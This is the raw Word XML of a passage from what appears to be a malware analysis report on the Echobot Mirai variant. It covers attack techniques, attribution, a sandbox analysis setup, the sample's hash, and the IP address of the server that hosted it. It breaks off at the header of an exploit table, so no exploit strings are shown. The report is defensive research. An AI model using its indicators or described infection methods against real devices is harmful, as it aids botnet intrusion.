            <w:r>
              <w:t>Discovery</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1983" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="636D9506" w14:textId="145D18D3" w:rsidR="005614C1" w:rsidRDefault="005614C1" w:rsidP="00B06445">
            <w:pPr>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>System Network Connections Discovery</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4760" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7DFAF6E5" w14:textId="490E7280" w:rsidR="005614C1" w:rsidRDefault="005614C1" w:rsidP="00062EAB">
            <w:pPr>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>The malware tries to identify IoT devices to infect</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00323367" w14:paraId="2B6304A6"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12672188" w14:textId="768236C1" w:rsidR="00323367" w:rsidRDefault="001B5D85" w:rsidP="00B06445">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>T1498</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1357" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="197E1D93" w14:textId="01AB0C3A" w:rsidR="00323367" w:rsidRDefault="001B5D85" w:rsidP="00B06445">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Impact</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1983" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1641489A" w14:textId="21501942" w:rsidR="00323367" w:rsidRDefault="001B5D85" w:rsidP="00B06445">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Network Denial of Service</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4760" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="618AF843" w14:textId="587964C7" w:rsidR="00323367" w:rsidRDefault="001B5D85" w:rsidP="00062EAB">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Mirai variant performs</w:t>
            </w:r>
            <w:r w:rsidR="00272DE9">
              <w:t xml:space="preserve"> network</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> DDoS attacks via its infected hosts</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="26F1D0A3" w14:textId="45AF9D76" w:rsidR="002A588A" w:rsidRDefault="002A588A" w:rsidP="00421C0E"/>
    <w:p w14:paraId="7308D678" w14:textId="4E0B51D7" w:rsidR="006F476B" w:rsidRDefault="00511AF4" w:rsidP="00511AF4">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="2" w:name="_Toc101284330"/>
      <w:r>
        <w:t>Threat intel insig</w:t>
      </w:r>
      <w:r w:rsidR="008302D3">
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>ts</w:t>
      </w:r>
      <w:bookmarkEnd w:id="2"/>
    </w:p>
    <w:p w14:paraId="03A6C22C" w14:textId="41316EC9" w:rsidR="002C22E0" w:rsidRDefault="002A214D" w:rsidP="005A463F">
      <w:r>
        <w:t>There is not enough evidence or information to attribute this attack to a specific group</w:t>
      </w:r>
      <w:r w:rsidR="00FA749B">
        <w:t xml:space="preserve"> or threat actor</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="003E32DD">
        <w:t xml:space="preserve"> Motivations </w:t>
      </w:r>
      <w:r w:rsidR="00EA70F1">
        <w:t xml:space="preserve">for the threat actor </w:t>
      </w:r>
      <w:r w:rsidR="003E32DD">
        <w:t>behind the Echobot attack in 2019 are unknown.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="747C3153" w14:textId="66B36890" w:rsidR="000E0283" w:rsidRPr="005A463F" w:rsidRDefault="002A214D" w:rsidP="005A463F">
      <w:r>
        <w:t xml:space="preserve">IoT Malware has become more prevalent over the past few years due to the leaking of the </w:t>
      </w:r>
      <w:r w:rsidR="00A364C3">
        <w:t xml:space="preserve">Mirai source code, allowing possibly anyone to create </w:t>
      </w:r>
      <w:r w:rsidR="005A21BA">
        <w:t>their own</w:t>
      </w:r>
      <w:r w:rsidR="00A364C3">
        <w:t xml:space="preserve"> IoT botnets with little skill</w:t>
      </w:r>
      <w:r w:rsidR="002B2B47">
        <w:t xml:space="preserve"> and by modifying </w:t>
      </w:r>
      <w:r w:rsidR="008C5476">
        <w:t xml:space="preserve">snippets of the code to suit </w:t>
      </w:r>
      <w:r w:rsidR="00BD1435">
        <w:t>their</w:t>
      </w:r>
      <w:r w:rsidR="008C5476">
        <w:t xml:space="preserve"> needs</w:t>
      </w:r>
      <w:r w:rsidR="00A364C3">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00D6742F">
        <w:t>With multiple IoT devices being rarely patched long-term</w:t>
      </w:r>
      <w:r w:rsidR="00FF55CE">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00D6742F">
        <w:t xml:space="preserve"> and more vulnerabilities being found and exploited</w:t>
      </w:r>
      <w:r w:rsidR="002B2B47">
        <w:t xml:space="preserve"> there may b</w:t>
      </w:r>
      <w:r w:rsidR="0070672C">
        <w:t xml:space="preserve">e a steady increase of IoT Botnets </w:t>
      </w:r>
      <w:r w:rsidR="00FF55CE">
        <w:t>and malware in the wild</w:t>
      </w:r>
      <w:r w:rsidR="0070672C">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="003E32DD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AF5B151" w14:textId="6E29D5E0" w:rsidR="00511AF4" w:rsidRDefault="005A463F" w:rsidP="005A463F">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="3" w:name="_Toc101284331"/>
      <w:r w:rsidRPr="005A463F">
        <w:t>Targets</w:t>
      </w:r>
      <w:bookmarkEnd w:id="3"/>
    </w:p>
    <w:p w14:paraId="50B1E235" w14:textId="4FD1F020" w:rsidR="00C924B1" w:rsidRDefault="00C924B1" w:rsidP="005A463F">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251666432" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="23F731D8" wp14:editId="60E35B77">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:align>left</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>590677</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5876290" cy="2731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33"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5876290" cy="2731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55A16">
        <w:t>In this case study, we used an architecture-specific</w:t>
      </w:r>
      <w:r w:rsidR="002B2D6F">
        <w:t xml:space="preserve"> virtual</w:t>
      </w:r>
      <w:r w:rsidR="00255A16">
        <w:t xml:space="preserve"> machine for ARM </w:t>
      </w:r>
      <w:r w:rsidR="0040351E">
        <w:t>to</w:t>
      </w:r>
      <w:r w:rsidR="00DF2DD6">
        <w:t xml:space="preserve"> dynamically</w:t>
      </w:r>
      <w:r w:rsidR="0040351E">
        <w:t xml:space="preserve"> analyze our specified malware sample ‘ECHOBOT.arm6’</w:t>
      </w:r>
      <w:r w:rsidR="00B71000">
        <w:t xml:space="preserve"> via Qemu 4.1.1 and BuildRoot 2</w:t>
      </w:r>
      <w:r w:rsidR="00B34D1C">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00B71000">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00DD3D12">
        <w:t>Using Docker, to import the ARM-machine</w:t>
      </w:r>
      <w:r w:rsidR="00116EA4">
        <w:t xml:space="preserve"> we ran the sample for 60 seconds </w:t>
      </w:r>
      <w:r w:rsidR="00E442A6">
        <w:t>to collect system calls and network traffic</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55F9B33E" w14:textId="47D1B600" w:rsidR="00C924B1" w:rsidRPr="006A6690" w:rsidRDefault="00C924B1" w:rsidP="00C924B1">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006A6690">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Figure 2.1 – Using Docker, Qemu/BuildRoot to analyze the Mirai sample dynamically</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A7289C3" w14:textId="375B9208" w:rsidR="00C924B1" w:rsidRDefault="00D50208" w:rsidP="00940CF8">
      <w:r>
        <w:t xml:space="preserve">Network traffic was then saved into a PCAP in which we further analyzed via Wireshark. The following figure below </w:t>
      </w:r>
      <w:r w:rsidR="006A1F2F">
        <w:t>d</w:t>
      </w:r>
      <w:r w:rsidR="00193506">
        <w:t>isplays the GeoIP</w:t>
      </w:r>
      <w:r w:rsidR="009E3DDE">
        <w:t xml:space="preserve"> location </w:t>
      </w:r>
      <w:r w:rsidR="0035435B">
        <w:t>sources of</w:t>
      </w:r>
      <w:r w:rsidR="009E3DDE">
        <w:t xml:space="preserve"> botnet traffic w</w:t>
      </w:r>
      <w:r w:rsidR="00E02C5E">
        <w:t>e collated and sorted</w:t>
      </w:r>
      <w:r w:rsidR="009E3DDE">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00CF1288">
        <w:t>via analyzing</w:t>
      </w:r>
      <w:r w:rsidR="009E3DDE">
        <w:t xml:space="preserve"> our Echobot sample</w:t>
      </w:r>
      <w:r w:rsidR="0095425F">
        <w:t>’s network traffic</w:t>
      </w:r>
      <w:r w:rsidR="009E3DDE">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40AFC0D0" w14:textId="75FBDE67" w:rsidR="00B359B1" w:rsidRDefault="00B16FC1" w:rsidP="00B359B1">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="1110"/>
        </w:tabs>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5A900D01" wp14:editId="2CC01B48">
            <wp:extent cx="5943600" cy="3042920"/>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39F14027" w14:textId="75EBBF0F" w:rsidR="00D03FD1" w:rsidRPr="00567679" w:rsidRDefault="00B359B1" w:rsidP="00567679">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="center" w:pos="4680"/>
        </w:tabs>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D71622">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Figure 2.</w:t>
      </w:r>
      <w:r w:rsidR="00785DE1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="00D71622">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> – Botnet Traffic</w:t>
      </w:r>
      <w:r w:rsidR="00971E8B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> sources</w:t>
      </w:r>
      <w:r w:rsidRPr="00D71622">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> of infected devices used for DDoS</w:t>
      </w:r>
      <w:r w:rsidR="0078423A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F13929">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>collated via Wireshark</w:t>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="04E378A6" w14:textId="35A4FEF2" w:rsidR="00421C0E" w:rsidRDefault="00421C0E" w:rsidP="003B713B">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="4" w:name="_Toc101284332"/>
      <w:r w:rsidRPr="00421C0E">
        <w:t>Technical Analysis</w:t>
      </w:r>
      <w:bookmarkEnd w:id="4"/>
    </w:p>
    <w:p w14:paraId="0A97C36F" w14:textId="53EF428A" w:rsidR="00BF6A60" w:rsidRDefault="00F13929" w:rsidP="001B57EF">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="5" w:name="_Toc101284333"/>
      <w:r>
        <w:t>Main Malware Sample</w:t>
      </w:r>
      <w:bookmarkEnd w:id="5"/>
    </w:p>
    <w:p w14:paraId="7E6A6D47" w14:textId="717C6818" w:rsidR="001B57EF" w:rsidRPr="002B007A" w:rsidRDefault="00D20D25" w:rsidP="001B57EF">
      <w:r>
        <w:t>The malware sample we analyzed,</w:t>
      </w:r>
      <w:r w:rsidR="002E77A7">
        <w:t xml:space="preserve"> ECHOBOT.arm6 </w:t>
      </w:r>
      <w:r w:rsidR="006253C5">
        <w:t xml:space="preserve">was </w:t>
      </w:r>
      <w:r w:rsidR="00F03BE4">
        <w:t xml:space="preserve">hosted on an open server </w:t>
      </w:r>
      <w:r w:rsidR="006253C5">
        <w:t>80.82.67.184</w:t>
      </w:r>
      <w:r w:rsidR="00F03BE4">
        <w:t xml:space="preserve"> where multiple other malicious</w:t>
      </w:r>
      <w:r w:rsidR="00413DF2">
        <w:t xml:space="preserve"> executables</w:t>
      </w:r>
      <w:r w:rsidR="004C5F2E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007C54BE">
        <w:t xml:space="preserve">for different processor architectures including ARM, MIPS, SPARC </w:t>
      </w:r>
      <w:r w:rsidR="00F03BE4">
        <w:t>were hosted</w:t>
      </w:r>
      <w:r w:rsidR="007C54BE">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="007912D8">
        <w:t xml:space="preserve"> Echobot.arm6 was one of such </w:t>
      </w:r>
      <w:r w:rsidR="00F82BD3">
        <w:t>malicious executables</w:t>
      </w:r>
      <w:r w:rsidR="007912D8">
        <w:t xml:space="preserve"> used to spread the</w:t>
      </w:r>
      <w:r w:rsidR="00F438D8">
        <w:t xml:space="preserve"> M</w:t>
      </w:r>
      <w:r w:rsidR="007912D8">
        <w:t>irai variant to new IoT devices</w:t>
      </w:r>
      <w:r w:rsidR="009167B3">
        <w:t>, adding more infected devices to the Echobot botnet</w:t>
      </w:r>
      <w:r w:rsidR="005C7BBB">
        <w:t xml:space="preserve"> to deliver DDoS attacks</w:t>
      </w:r>
      <w:r w:rsidR="009167B3">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="001E1D02">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="GridTable4-Accent1"/>
        <w:tblW w:w="9445" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1680"/>
        <w:gridCol w:w="3437"/>
        <w:gridCol w:w="1482"/>
        <w:gridCol w:w="1309"/>
        <w:gridCol w:w="1537"/>
      </w:tblGrid>
      <w:tr w:rsidR="00421C0E" w14:paraId="67734865" w14:textId="77777777" w:rsidTr="00275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EFD8A1" w14:textId="0EB0A017" w:rsidR="00421C0E" w:rsidRDefault="00421C0E" w:rsidP="00421C0E">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>Filename</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1870" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4F566DAE" w14:textId="2BEC1B91" w:rsidR="00421C0E" w:rsidRDefault="00421C0E" w:rsidP="00421C0E">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="100000000000" w:firstRow="1" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r w:rsidRPr="00421C0E">
              <w:t>MD5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1870" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="41BA9A35" w14:textId="41DE3D97" w:rsidR="00421C0E" w:rsidRDefault="00762276" w:rsidP="00421C0E">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="100000000000" w:firstRow="1" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>ELF</w:t>
            </w:r>
            <w:r w:rsidR="00421C0E">
              <w:t xml:space="preserve"> Timestamp</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1870" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2EBAAF9B" w14:textId="0B11BDD5"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Size (in Bytes)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1965" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4AEFAAAB" w14:textId="0CBFA838"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Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00421C0E" w14:paraId="65113CC7" w14:textId="77777777" w:rsidTr="00275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CAD4892" w14:textId="2FDA78D3" w:rsidR="00421C0E" w:rsidRDefault="00762276" w:rsidP="00421C0E">
            <w:r>
              <w:t>ECHOBOT.arm6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1870" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2EC5E8E0" w14:textId="0F019B35" w:rsidR="00421C0E" w:rsidRDefault="00762276" w:rsidP="00421C0E">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r w:rsidRPr="00762276">
              <w:t>78b5d0f5d10792b1d816227015a9296b</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1870" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="79839910" w14:textId="02801576" w:rsidR="00421C0E" w:rsidRDefault="0093428E" w:rsidP="00421C0E">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>2019-12-03 18:24:07 UTC</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1870" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4893E3C9" w14:textId="4530BE6F" w:rsidR="00421C0E" w:rsidRDefault="008B50AB" w:rsidP="00421C0E">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>866759 bytes</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1965" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6C96824A" w14:textId="7989DC1C" w:rsidR="00421C0E" w:rsidRDefault="00A867D6" w:rsidP="00421C0E">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Elf</w:t>
            </w:r>
            <w:r w:rsidR="002E77A7">
              <w:t xml:space="preserve"> 32-Bit Executable, ARM, </w:t>
            </w:r>
            <w:r>
              <w:t>Mirai Botnet Variant</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="38FBE29A" w14:textId="4AFD826D" w:rsidR="00421C0E" w:rsidRDefault="00421C0E" w:rsidP="00421C0E"/>
    <w:p w14:paraId="74A62169" w14:textId="4E6BFD38" w:rsidR="00275A33" w:rsidRDefault="00275A33" w:rsidP="00275A33">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="6" w:name="_Toc101284334"/>
      <w:r>
        <w:t>Exploits</w:t>
      </w:r>
      <w:r w:rsidR="00F71DCF">
        <w:t>/Vu</w:t>
      </w:r>
      <w:r w:rsidR="00B66EFB">
        <w:t>ln</w:t>
      </w:r>
      <w:r w:rsidR="00F71DCF">
        <w:t>erabilities</w:t>
      </w:r>
      <w:bookmarkEnd w:id="6"/>
    </w:p>
    <w:p w14:paraId="43D365B6" w14:textId="4F0DB27A" w:rsidR="00D20D25" w:rsidRPr="00D20D25" w:rsidRDefault="00BE7AC8" w:rsidP="00D20D25">
      <w:r>
        <w:t xml:space="preserve">This Echobot variant uses multiple </w:t>
      </w:r>
      <w:r w:rsidR="00A51EB2">
        <w:t xml:space="preserve">RCE (Remote Code Execution) </w:t>
      </w:r>
      <w:r w:rsidR="002707F3">
        <w:t>exploits</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to infect and propagate to other </w:t>
      </w:r>
      <w:r w:rsidR="00DC3CA9">
        <w:t xml:space="preserve">vulnerable </w:t>
      </w:r>
      <w:r>
        <w:t>IoT devices</w:t>
      </w:r>
      <w:r w:rsidR="005468FD">
        <w:t xml:space="preserve"> to be used in the botnet</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00F55AC3">
        <w:t xml:space="preserve"> Most of the common vulnerabilities we found targeted network routers</w:t>
      </w:r>
      <w:r w:rsidR="009A4491">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00541FF3">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009A4491">
        <w:t>smart home</w:t>
      </w:r>
      <w:r w:rsidR="00F55AC3">
        <w:t xml:space="preserve"> devices,</w:t>
      </w:r>
      <w:r w:rsidR="00D87E73">
        <w:t xml:space="preserve"> wireless</w:t>
      </w:r>
      <w:r w:rsidR="00F55AC3">
        <w:t xml:space="preserve"> cameras</w:t>
      </w:r>
      <w:r w:rsidR="00744F37">
        <w:t>, cloud platforms</w:t>
      </w:r>
      <w:r w:rsidR="007D45FD">
        <w:t>, NAS systems</w:t>
      </w:r>
      <w:r w:rsidR="00F55AC3">
        <w:t xml:space="preserve"> and linux servers.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="002F06E4">
        <w:t>We counted more than 20 exploits</w:t>
      </w:r>
      <w:r w:rsidR="00DF2A99">
        <w:t xml:space="preserve"> that</w:t>
      </w:r>
      <w:r w:rsidR="002F06E4">
        <w:t xml:space="preserve"> were used in this sample. </w:t>
      </w:r>
      <w:r w:rsidR="00D43116">
        <w:t>A list</w:t>
      </w:r>
      <w:r w:rsidR="00D20D25">
        <w:t xml:space="preserve"> of</w:t>
      </w:r>
      <w:r w:rsidR="00D43116">
        <w:t xml:space="preserve"> some of</w:t>
      </w:r>
      <w:r w:rsidR="00D20D25">
        <w:t xml:space="preserve"> the CVE exploits that we found</w:t>
      </w:r>
      <w:r w:rsidR="000A0F19">
        <w:t xml:space="preserve"> are listed below</w:t>
      </w:r>
      <w:r w:rsidR="00D20D25">
        <w:t xml:space="preserve"> while analyzing the malware statically via </w:t>
      </w:r>
      <w:r w:rsidR="00D20D25" w:rsidRPr="00C452A9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>binutils</w:t>
      </w:r>
      <w:r w:rsidR="008C1BFA">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D20D25">
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r w:rsidR="00D20D25" w:rsidRPr="00C452A9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>ghidra</w:t>
      </w:r>
      <w:r w:rsidR="00D20D25">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="GridTable4-Accent1"/>
        <w:tblW w:w="11057" w:type="dxa"/>
        <w:tblInd w:w="-856" w:type="dxa"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2269"/>
        <w:gridCol w:w="5604"/>
        <w:gridCol w:w="3184"/>
      </w:tblGrid>
      <w:tr w:rsidR="008C77A4" w14:paraId="3058B384" w14:textId="02177A9D" w:rsidTr="008C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24CE3DB" w14:textId="29677BE1" w:rsidR="008C77A4" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:lastRenderedPageBreak/>
              <w:t>CVE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5604" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="125DA578" w14:textId="72397ED4" w:rsidR="008C77A4" w:rsidRDefault="008C77A4" w:rsidP="00B06445">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="100000000000" w:firstRow="1" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>Exploit Format</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3184" w:type="dxa"/>
          </w:tcPr>
